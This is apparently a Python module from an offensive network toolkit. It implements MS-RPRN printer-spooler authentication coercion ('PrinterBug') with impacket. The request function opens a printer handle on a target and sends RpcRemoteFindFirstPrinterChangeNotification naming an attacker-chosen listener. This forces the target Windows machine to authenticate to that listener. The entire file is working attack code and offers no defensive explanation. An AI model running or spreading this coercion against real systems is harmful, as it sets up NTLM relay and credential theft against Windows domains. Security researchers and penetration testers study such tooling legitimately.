from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.rprn import PRINTER_HANDLE, PRINTER_CHANGE_ADD_JOB, hRpcOpenPrinter
from impacket.dcerpc.v5.dtypes import LPWSTR, DWORD, LPBYTE, NULL


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
    opnum = 62
    structure = (
        ("hPrinter", PRINTER_HANDLE),
        ("fdwFlags", DWORD),
        ("fdwOptions", DWORD),
        ("pszLocalMachine", LPWSTR),
        ("dwPrinterLocal", DWORD),
        ("cbBuffer", DWORD),
        ("pBuffer", LPBYTE),
    )


class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
    structure = ()


def request(dce, target, listener):
    resp = hRpcOpenPrinter(dce, f"\\\\{target}\x00")

    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
    request = RpcRemoteFindFirstPrinterChangeNotification()
    request["hPrinter"] = resp["pHandle"]
    request["fdwFlags"] = PRINTER_CHANGE_ADD_JOB
    request["pszLocalMachine"] = f"\\\\{listener}\x00"
    request["fdwOptions"] = 0x00000000
    request["dwPrinterLocal"] = 0
    request["cbBuffer"] = NULL
    request["pBuffer"] = NULL
    dce.request(request)